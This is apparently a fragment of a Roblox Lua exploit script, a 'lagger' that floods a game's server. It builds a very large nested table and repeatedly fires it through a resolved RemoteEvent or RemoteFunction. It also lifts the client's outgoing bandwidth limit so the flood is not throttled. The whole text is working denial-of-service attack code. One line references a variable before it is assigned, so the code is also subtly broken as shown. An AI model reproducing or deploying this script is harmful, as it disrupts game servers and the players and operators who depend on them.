local function resolveRemote(path)
    if not path or path == "" then return nil end local obj = game local cleaned = path:gsub("^game%.", "")
    for seg in cleaned:gmatch("[^%.]+") do if obj then obj = obj[seg] else return nil end end return obj
end

local function bomb(tblInc, tries, maxTbl)
    local mainTbl, nested, z = {}, {{}}, nested[1]
    for i = 1, tblInc do local ins = {} table.insert(z, ins) z = ins end
    local maximum = math.floor((maxTbl or 150000) / (tblInc + 2))
    for i = 1, maximum do table.insert(mainTbl, nested) if i % 8000 == 0 then task.wait() end end
    local remote = resolveRemote(RemotePath)
    if remote then for i = 1, tries do pcall(function() if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then remote:FireServer(mainTbl) elseif remote:IsA("RemoteFunction") then remote:InvokeServer(mainTbl) end end) end end
end

local function startLaggerLoop() while LAG_ST.LaggerOn and _G.ExtRunning and LAG_ST.CoreActive do pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end) task.spawn(bomb, ActiveConfig.tables, ActiveConfig.tries, ActiveConfig.maxTbl) task.wait(math.max(ActiveConfig.loopWait, 0.1)) end end
